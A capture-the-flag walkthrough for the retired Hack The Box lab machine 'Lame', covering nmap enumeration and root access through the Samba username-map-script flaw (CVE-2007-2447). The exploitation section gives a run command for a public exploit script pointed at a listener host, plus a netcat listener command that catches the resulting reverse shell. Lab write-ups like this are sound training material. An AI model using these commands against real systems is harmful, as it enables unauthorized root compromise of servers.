# 

Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.
# Info

- _OS_ - Linux
- _Difficulty_ - Easy
- _Points_ - /
- _Release_ - 14 Mar, 2017
- _IP_ - 10.10.10.3

__________________________________________________________
# Enumeration 

```nmap 10.10.10.3 -sC -sV -Pn
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-15 12:58 CEST
Nmap scan report for 10.10.10.3 (10.10.10.3)
Host is up (0.055s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  @�LV      Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 2h00m21s, deviation: 2h49m45s, median: 19s
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-09-15T06:59:20-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.95 seconds
```

Here we can see that there is no http or https open ports so we can check out the services versions we can see in the nmap scan.

After going through services and googling we can see that there is known Samba vulnerability:

https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2007-2447

After a research about this vulnerability we could learn this:

To exploit this vulnerability, we would send a specially crafted request to the Samba server, taking advantage of the username map script feature. By doing so, we can execute arbitrary code with the privileges of the Samba server process, potentially gaining control over the server.

On Github we can find the exploit for this exact CVE and usage guide:

https://github.com/amriunix/CVE-2007-2447

![[Pasted image 20230915145219.png]]

# Exploitation

Now we are gonna install this exploit and use it against our target!

We can see our IP address by running ``ifconfig`` 

![[Pasted image 20230915145611.png]]


```python usermap_script.py <RHOST> <RPORT> <LHOST> <LPORT>```

- `RHOST` -- The target address
- `RPORT` -- The target port (TCP : 139)
- `LHOST` -- The listen address
- `LPORT` -- The listen port

Which means mine command should look like this:

`python usermap_script.py 10.10.10.3 139 10.10.14.5 1234`

**Before running the exploit we should run Netcat listener like this:**

`nc -lvnp 1234`

After running the exploit we get the shell as the root!

![[Pasted image 20230915150428.png]]

